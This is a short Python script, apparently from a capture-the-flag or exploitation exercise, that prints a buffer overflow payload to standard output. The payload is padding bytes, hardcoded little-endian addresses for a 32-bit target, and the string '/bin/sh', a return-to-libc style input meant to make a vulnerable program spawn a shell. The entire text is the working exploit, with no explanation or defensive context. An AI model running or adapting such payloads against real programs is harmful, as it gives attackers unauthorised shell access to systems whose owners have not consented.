import sys
sys.stdout.buffer.write((b"\x41" * 22) + 0x0804fef0.to_bytes(4, "little") + (b"\x41" * 4) + 0xfff6e99c.to_bytes(4, "little") + (b"\x41" * 36) + bytes("/bin/sh", "latin-1"))